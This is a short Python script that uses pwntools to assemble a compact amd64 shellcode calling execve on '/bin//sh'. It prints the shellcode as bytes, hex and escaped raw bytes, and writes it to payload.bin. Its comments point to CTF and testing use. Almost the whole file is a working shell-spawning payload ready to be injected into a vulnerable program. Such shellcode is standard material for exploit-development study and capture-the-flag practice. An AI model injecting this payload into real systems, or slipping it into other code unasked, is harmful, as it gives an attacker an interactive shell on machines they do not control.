from pwn import *

context.arch = 'amd64'  # Set architecture to amd64

# Create the shellcode using the one of the shortest asm I've seen
shellcode = asm(
    '''
        xor esi, esi
        push rsi
        mov rbx, 0x68732f2f6e69622f
        push rbx
        push rsp
        pop rdi
        imul esi
        mov al, 0x3b
        syscall
    '''
)

# Output the shellcode in a hex format that can be used in CTFs or testing
print(f"Shellcode: {shellcode}")
print(f"Shellcode HEX: {shellcode.hex()}")

# Output the shellcode in a raw format
raw_output = ''.join(f'\\x{byte:02x}' for byte in shellcode)
print(f"Raw Shellcode: {raw_output}")

# Output the length of the shellcode
print(f"Shellcode Length: {len(shellcode)} bytes")

# Write the shellcode to a binary file
with open('payload.bin', 'wb') as f:
    f.write(shellcode)
